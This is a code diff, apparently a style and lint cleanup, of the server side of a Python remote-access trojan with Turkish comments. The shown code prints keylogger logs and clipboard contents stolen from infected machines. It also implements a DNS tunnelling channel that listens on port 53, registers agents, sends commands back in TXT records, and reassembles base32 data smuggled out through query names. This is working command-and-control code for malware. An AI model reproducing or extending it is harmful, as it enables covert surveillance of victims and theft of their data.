+                            lines = logs.split("\n")
+                            print("\n".join(lines[:10]))  # İlk 10 satırı göster
                             if len(lines) > 10:
                                 print(f"... (toplam {len(lines)} satır)")
                             print("-" * 40)
-                                
+
                         except Exception as e:
-                            print(f"[!] Keylog kaydetme hatası: {str(e)}")
+                            print(f"[!] Keylog kaydetme hatası: {e!s}")
 
                     # Clipboard Verisi: Pano içeriğini göster
                     elif response.startswith("CLIPBOARD_DATA:"):
                         try:
                             b64_content = response.split(":", 1)[1]
-                            content = base64.b64decode(b64_content).decode('utf-8')
-                            
+                            content = base64.b64decode(b64_content).decode("utf-8")
+
                             print("-" * 40)
                             print("[+] 📋 Pano İçeriği:")
                             print("-" * 40)
                             print(content)
                             print("-" * 40)
                         except Exception as e:
-                            print(f"[!] Pano verisi okuma hatası: {str(e)}")
-                            
+                            print(f"[!] Pano verisi okuma hatası: {e!s}")
+
                     else:
                         print(response)
                 else:
@@ -837,10 +929,12 @@ class Handler(BaseHandler):
                     if shared_state.session_manager and self.session_id:
                         with shared_state.session_manager.lock:
                             if self.session_id in shared_state.session_manager.sessions:
-                                del shared_state.session_manager.sessions[self.session_id]
+                                del shared_state.session_manager.sessions[
+                                    self.session_id
+                                ]
                     self.session_id = None
                     break
-                    
+
             except KeyboardInterrupt:
                 print("\n[*] Interaktif moddan çıkılıyor (Ctrl+C).")
                 break
@@ -853,34 +947,35 @@ class Handler(BaseHandler):
 # DNS Tünel Handler
 # ============================================================
 
+
 class DNSChannelHandler:
     """DNS tünelleme iletişim kanalı handler'ı.
-    
+
     Agent'ın DNS sorguları üzerinden gönderdiği verileri alır
     ve DNS TXT kayıtları ile komut gönderir.
-    
+
     UDP port 53 üzerinde dinler (root yetkisi gerekebilir).
-    
+
     Args:
         options: Handler seçenekleri (LHOST, DNS_PORT vb.)
     """
 
-    def __init__(self, options: Dict[str, Any]):
+    def __init__(self, options: dict[str, Any]):
         self.lhost = options.get("LHOST", "0.0.0.0")
         self.dns_port = int(options.get("DNS_PORT", 53))
         self.running = False
         self.sock = None
-        self._sessions = {}      # session_hash -> {"addr", "data_buffer", "pending_cmd"}
+        self._sessions = {}  # session_hash -> {"addr", "data_buffer", "pending_cmd"}
         self._pending_response = None
         self._lock = threading.Lock()
 
     def _build_dns_response(self, query_data: bytes, txt_value: str) -> bytes:
         """DNS TXT cevap paketi oluşturur.
-        
+
         Args:
             query_data: Orijinal DNS sorgu paketi (header + question kopyalanır).
             txt_value: TXT kaydına yazılacak değer.
-            
+
         Returns:
             bytes: DNS cevap paketi.
         """
@@ -889,7 +984,7 @@ class DNSChannelHandler:
 
         # Transaction ID'yi koru, flags = response + authoritative
         txn_id = query_data[:2]
-        flags = struct.pack('>H', 0x8400)  # QR=1, AA=1
+        flags = struct.pack(">H", 0x8400)  # QR=1, AA=1
 
         # Question section'ı bul
         pos = 12
@@ -906,16 +1001,16 @@ class DNSChannelHandler:
         question_section = query_data[12:pos]
 
         # Header: QDCOUNT=1, ANCOUNT=1
-        header = txn_id + flags + struct.pack('>HHHH', 1, 1, 0, 0)
+        header = txn_id + flags + struct.pack(">HHHH", 1, 1, 0, 0)
 
         # Answer: pointer to question name + TXT record
-        txt_bytes = txt_value.encode('utf-8')
+        txt_bytes = txt_value.encode("utf-8")
         answer = (
-            b'\xc0\x0c'               # Name pointer to question
-            + struct.pack('>HH', 16, 1)  # TYPE=TXT, CLASS=IN
-            + struct.pack('>I', 60)      # TTL=60
-            + struct.pack('>H', len(txt_bytes) + 1)  # RDLENGTH
-            + struct.pack('B', len(txt_bytes))         # TXT length byte
+            b"\xc0\x0c"  # Name pointer to question
+            + struct.pack(">HH", 16, 1)  # TYPE=TXT, CLASS=IN
+            + struct.pack(">I", 60)  # TTL=60
+            + struct.pack(">H", len(txt_bytes) + 1)  # RDLENGTH
+            + struct.pack("B", len(txt_bytes))  # TXT length byte
             + txt_bytes
         )
 
@@ -932,9 +1027,9 @@ class DNSChannelHandler:
             if label_len & 0xC0 == 0xC0:
                 break
             pos += 1
-            labels.append(data[pos:pos + label_len].decode('ascii', errors='ignore'))
+            labels.append(data[pos : pos + label_len].decode("ascii", errors="ignore"))
             pos += label_len
-        return '.'.join(labels)
+        return ".".join(labels)
 
     def start(self):
         """DNS handler'ı başlatır (UDP port 53)."""
@@ -961,16 +1056,18 @@ class DNSChannelHandler:
                     if qname.startswith("reg."):
                         response = self._build_dns_response(data, "OK")
                         self.sock.sendto(response, addr)
-                        parts = qname.split('.')
+                        parts = qname.split(".")
                         if len(parts) >= 3:
                             session_hash = parts[1]
                             with self._lock:
                                 self._sessions[session_hash] = {
                                     "addr": addr,
                                     "data_buffer": {},
-                                    "pending_cmd": None
+                                    "pending_cmd": None,
                                 }
-                            print(f"[+] DNS Agent kaydı: {session_hash} ({addr[0]}:{addr[1]})")
+                            print(
+                                f"[+] DNS Agent kaydı: {session_hash} ({addr[0]}:{addr[1]})"
+                            )
 
                     # Polling sorgusu: poll.<domain>
                     elif qname.startswith("poll."):
@@ -978,9 +1075,10 @@ class DNSChannelHandler:
                         with self._lock:
                             if self._pending_response:
                                 import base64
+
                                 encoded = base64.b64encode(
-                                    self._pending_response.encode('utf-8')
-                                ).decode('utf-8')
+                                    self._pending_response.encode("utf-8")
+                                ).decode("utf-8")
                                 response_txt = f"COMPLETE:{encoded}"
                                 self._pending_response = None
 
@@ -988,18 +1086,23 @@ class DNSChannelHandler:
                         self.sock.sendto(response, addr)
 
                     # Veri sorgusu: <encoded>.<seq_info>.<domain>
-                    elif any(qname.split('.')[-2].startswith('s') and 't' in qname.split('.')[-2] for _ in [1] if len(qname.split('.')) >= 3):
-                        parts = qname.split('.')
+                    elif any(
+                        qname.split(".")[-2].startswith("s")
+                        and "t" in qname.split(".")[-2]
+                        for _ in [1]
+                        if len(qname.split(".")) >= 3
+                    ):
+                        parts = qname.split(".")
                         # seq_info parsing: s<idx>t<total>
                         seq_info = parts[-2] if len(parts) >= 3 else ""
                         try:
-                            s_pos = seq_info.index('s')
-                            t_pos = seq_info.index('t')
-                            seq_idx = int(seq_info[s_pos+1:t_pos])
-                            seq_total = int(seq_info[t_pos+1:])
+                            s_pos = seq_info.index("s")
+                            t_pos = seq_info.index("t")
+                            seq_idx = int(seq_info[s_pos + 1 : t_pos])
+                            seq_total = int(seq_info[t_pos + 1 :])
 
                             # Data labels (seq ve domain hariç)
-                            data_labels = '.'.join(parts[:-2])
+                            data_labels = ".".join(parts[:-2])
 
                             with self._lock:
                                 for session in self._sessions.values():
@@ -1008,16 +1111,21 @@ class DNSChannelHandler:
                                         # Tüm parçalar geldiyse birleştir
                                         if len(session["data_buffer"]) == seq_total:
                                             import base64
-                                            full_encoded = ''.join(
+
+                                            full_encoded = "".join(
                                                 session["data_buffer"][i]
                                                 for i in range(seq_total)
                                             )
                                             try:
-                                                padding = (8 - len(full_encoded) % 8) % 8
+                                                padding = (
+                                                    8 - len(full_encoded) % 8
+                                                ) % 8
                                                 decoded = base64.b32decode(
-                                                    full_encoded.upper() + '=' * padding
-                                                ).decode('utf-8')
-                                                print(f"[+] DNS Veri alındı: {decoded[:80]}...")
+                                                    full_encoded.upper() + "=" * padding
+                                                ).decode("utf-8")
+                                                print(
+                                                    f"[+] DNS Veri alındı: {decoded[:80]}..."
+                                                )
                                             except Exception:
                                                 pass
                                             session["data_buffer"] = {}
@@ -1034,7 +1142,7 @@ class DNSChannelHandler:
                         response = self._build_dns_response(data, "")
                         self.sock.sendto(response, addr)
 
-                except socket.timeout:
+                except TimeoutError:
                     continue
                 except Exception as e:
                     if self.running:
@@ -1050,7 +1158,7 @@ class DNSChannelHandler:
 
     def send_command(self, command: str):
         """Agent'a gönderilecek komutu kuyruğa ekler.
-        
+
         Komut, agent'ın bir sonraki poll sorgusunda TXT kaydı olarak döner.
         """
         with self._lock:
@@ -1060,8 +1168,6 @@ class DNSChannelHandler:
         """DNS Handler'ı durdurur."""
         self.running = False
         if self.sock:
-            try:
+            with contextlib.suppress(Exception):
                 self.sock.close()
-            except Exception:
-                pass
             self.sock = None
